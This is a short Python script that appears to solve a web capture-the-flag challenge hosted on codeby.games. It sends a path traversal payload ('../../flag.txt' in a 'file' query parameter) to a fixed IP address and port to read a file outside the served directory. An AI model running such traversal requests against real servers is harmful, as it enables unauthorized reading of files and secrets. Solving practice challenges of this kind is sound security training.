from requests import get


def get_flag() -> str:
    """
    https://codeby.games/en/categories/web/cdd2d7e7-495e-4a14-b0ea-cae75b7b21a3
    """

    base_url = 'http://62.173.140.174'
    port = 16012
    path = 'static'
    query_param = '../../flag.txt'

    response = get(f'{base_url}:{port}/{path}?file={query_param}')

    flag = response.text

    return flag


if __name__ == '__main__':
    print(get_flag())
